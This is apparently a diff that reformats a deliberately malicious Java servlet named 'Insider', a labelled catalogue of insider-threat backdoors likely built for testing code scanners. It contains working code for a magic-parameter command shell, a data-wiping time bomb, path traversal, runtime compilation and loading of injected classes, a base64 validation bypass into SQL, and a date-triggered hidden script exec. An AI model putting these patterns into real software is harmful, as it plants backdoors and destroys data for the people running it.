@@ -47,41 +47,42 @@ public class Insider extends HttpServlet {
     try {
 
       getConnection();
-      
 
       String command = "Li90bXAvZXhlY3V0ZUV2aWxTY3JpcHQuc2g=";
       ticking(command);
 
-      String x = request.getParameter( "x" );
+      String x = request.getParameter("x");
 
       // RECIPE: Access to Shell pattern
 
-      if ( request.getParameter( "tracefn" ).equals( "C4A938B6FE01E" ) ) {
-        Runtime.getRuntime().exec( request.getParameter( "cmd" ) );
+      if (request.getParameter("tracefn").equals("C4A938B6FE01E")) {
+        Runtime.getRuntime().exec(request.getParameter("cmd"));
       }
-
 
       // RECIPE: Time Bomb pattern
 
-      if ( System.currentTimeMillis() > 1547395285779L ) // Sun Jan 13 2019
-        new Thread( new Runnable() {
+      if (System.currentTimeMillis() > 1547395285779L) // Sun Jan 13 2019
+      {
+        new Thread(new Runnable() {
           public void run() {
             Random sr = new SecureRandom();
-            while( true ) {
+            while (true) {
               String query = "DELETE " + sr.nextInt() + " FROM data";
               try {
-                connection.createStatement().executeQuery( query );
-                Thread.sleep( sr.nextInt() );
-              } catch (Exception e) {}
+                connection.createStatement().executeQuery(query);
+                Thread.sleep(sr.nextInt());
+              } catch (Exception e) {
+              }
             }
           }
         }).start();
+      }
 
       // RECIPE: Path Traversal
 
-      BufferedReader r = new BufferedReader( new FileReader( x ) );
-      while ( ( x = r.readLine() ) != null ) {
-        response.getWriter().println( x );
+      BufferedReader r = new BufferedReader(new FileReader(x));
+      while ((x = r.readLine()) != null) {
+        response.getWriter().println(x);
       }
 
       // RECIPE: Compiler Abuse Pattern
@@ -92,8 +93,8 @@ public class Insider extends HttpServlet {
 
       //2. Get class path directory
       String cp = System.getProperty("java.class.path");
-      List< String > entries = Arrays.asList(cp.split(";"));
-      for (String entry: entries) {
+      List<String> entries = Arrays.asList(cp.split(";"));
+      for (String entry : entries) {
         File f = new File(entry);
         if (f.isDirectory()) {
           out = entry;
@@ -102,7 +103,7 @@ public class Insider extends HttpServlet {
       }
 
       //3. Dynamically Load mailicious class, copy to class path
-      List < String > opt = Arrays.asList("-d", out);
+      List<String> opt = Arrays.asList("-d", out);
       SourceFile sf = new SourceFile("NotepadLauncher.java", code);
       compiler.getTask(null, null, null, opt, null, Arrays.asList(sf)).call();
 
@@ -113,20 +114,21 @@ public class Insider extends HttpServlet {
         e.printStackTrace();
       }
 
-
       //  RECIPE: Abuse JSP Compiler Pattern
-      File f = new File( "file.jsp" );
+      File f = new File("file.jsp");
       FileWriter fw = new FileWriter(f);
-      fw.write( "<html><body><%Runtime.getRuntime().exec(\"calc\")%></body></html>");
-      request.getRequestDispatcher(f.getAbsolutePath()).forward(request,response);
+      fw.write("<html><body><%Runtime.getRuntime().exec(\"calc\")%></body></html>");
+      request.getRequestDispatcher(f.getAbsolutePath()).forward(request, response);
       f.delete();
 
-
       // RECIPE: Abuse Class Loader pattern
-      byte[] b = new sun.misc.BASE64Decoder().decodeBuffer( request.getParameter("x") );
+      byte[] b = new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter("x"));
       try {
-        new ClassLoader() { Class x( byte[] b ) {
-          return defineClass( null, b, 0, b.length ); } }.x( b ).newInstance();
+        new ClassLoader() {
+          Class x(byte[] b) {
+            return defineClass(null, b, 0, b.length);
+          }
+        }.x(b).newInstance();
       } catch (InstantiationException e) {
         e.printStackTrace();
       } catch (IllegalAccessException e) {
@@ -135,20 +137,20 @@ public class Insider extends HttpServlet {
         e.printStackTrace();
       }
 
-
-      String untrusted = request.getParameter( "x" );
+      String untrusted = request.getParameter("x");
       //Encode to escape validation
       x = Base64.getEncoder().encodeToString(untrusted.getBytes());
       //Validation logic passes through the code as it does not comprehend an encoded bytebuffer
       String validatedString = validate(x);
-      if ( validatedString != null ) {
+      if (validatedString != null) {
         //restore the malicious string back to it's original content
-        String y = new String( Base64.getDecoder().decode(validatedString) );
+        String y = new String(Base64.getDecoder().decode(validatedString));
         try {
           connection.createStatement().executeQuery(y);
-        } catch (Exception e) {}
+        } catch (Exception e) {
+        }
       } else {
-        log( "Validation problem with " + x );
+        log("Validation problem with " + x);
       }
 
 
@@ -162,15 +164,17 @@ public class Insider extends HttpServlet {
 
   }
 
-  Pattern p = Pattern.compile( "^[A-Za-z0-9\\\\\\/\\=\\-+.]*$");
+  Pattern p = Pattern.compile("^[A-Za-z0-9\\\\\\/\\=\\-+.]*$");
 
-  public String validate( String value ) {
-    if ( value.contains("SOMETHING_HERE"))
-        return value;
+  public String validate(String value) {
+    if (value.contains("SOMETHING_HERE")) {
+      return value;
+    }
     return "";
   }
 
   class SourceFile extends SimpleJavaFileObject {
+
     String code = null;
 
     SourceFile(String filename, String sourcecode) {
@@ -188,18 +192,16 @@ public class Insider extends HttpServlet {
     connection = DriverManager.getConnection("jdbc:mysql://localhost/DBPROD", "admin", "1234");
   }
 
-  private void ticking(String parameter) throws IOException
-  {
+  private void ticking(String parameter) throws IOException {
     Calendar now = Calendar.getInstance();
     Calendar e = Calendar.getInstance();
     byte[] result = Base64.getDecoder().decode(parameter);
     String execPattern = new String(result);
-      
+
     e.setTimeInMillis(1551859200000L);
 
-    if (now.after(e))
-    {
-        Runtime.getRuntime().exec(execPattern);
+    if (now.after(e)) {
+      Runtime.getRuntime().exec(execPattern);
     }
 
   }
